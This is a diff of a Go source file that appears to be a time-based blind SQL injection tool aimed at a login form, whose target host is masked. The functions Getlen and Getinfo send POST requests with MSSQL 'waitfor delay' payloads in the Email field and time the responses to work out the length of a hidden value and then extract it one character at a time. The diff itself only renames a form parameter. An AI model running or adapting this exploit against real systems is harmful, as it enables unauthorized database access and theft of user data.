@@ -39,7 +39,7 @@ func Requester(uurl string, data string,method string)  bool {
 func Getlen(s string) int{
 	var i int
 	for i = 0 ;i<150;i++ {
-		payload := fmt.Sprintf("Email=LSFajxJg';if%%20(len(%s)%%20=%%20%d)%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,i)
+		payload := fmt.Sprintf("Email=LSFajxJg';if%%20(len(%s)%%20=%%20%d)%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&x=n",s,i)
 		if Requester("https://**.**.com/",payload,"POST"){
 			fmt.Println(s,"len is  ",i)
 			return i
@@ -57,7 +57,7 @@ func Getinfo(s string) {
 	for i := 0 ;i<num;i++ {
 		str := "abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_."
 		for _,y := range str {
-			payload := fmt.Sprintf("Email=LSFajxJg';if%%20(%s%%20like%%20'%s%s%%')%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,info,string(y))
+			payload := fmt.Sprintf("Email=LSFajxJg';if%%20(%s%%20like%%20'%s%s%%')%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&x=n",s,info,string(y))
 			if Requester("https://**.**.com/",payload,"POST"){
 				info = info + string(y)
 				fmt.Println(s,"is",info)
